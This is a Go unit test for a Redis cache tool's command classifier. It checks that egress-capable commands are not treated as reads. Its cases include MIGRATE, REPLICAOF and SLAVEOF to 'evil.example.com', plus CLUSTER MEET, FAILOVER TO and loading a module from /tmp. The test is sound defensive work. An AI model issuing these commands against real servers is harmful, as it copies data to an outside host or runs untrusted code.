package cachex

import (
	"testing"

	"github.com/sgnd/komando/internal/driver"
)

// Commands that make the server connect to another host (and send it
// keys) are not reads: cache run needs --write for them, so an ssh-gate
// read key or an agent cannot copy data out through the cache.
func TestClassifyEgress(t *testing.T) {
	for _, c := range [][]string{
		{"MIGRATE", "evil.example.com", "6379", "key", "0", "5000"},
		{"MIGRATE", "evil", "6379", "", "0", "5000", "KEYS", "a", "b"},
		{"REPLICAOF", "evil.example.com", "6379"}, {"SLAVEOF", "evil", "6379"},
		{"CLUSTER", "MEET", "1.2.3.4", "6379"}, {"SENTINEL", "MONITOR", "m", "1.2.3.4", "6379", "2"},
		{"MODULE", "LOAD", "/tmp/x.so"}, {"CONFIG", "SET", "masterauth", "x"}, {"FAILOVER", "TO", "evil", "6379"},
		{"migrate", "evil", "6379", "key", "0", "5000"},
	} {
		if v := Classify(c); v.Risk == driver.RiskRead {
			t.Errorf("%q: classed a read", c)
		}
	}
}
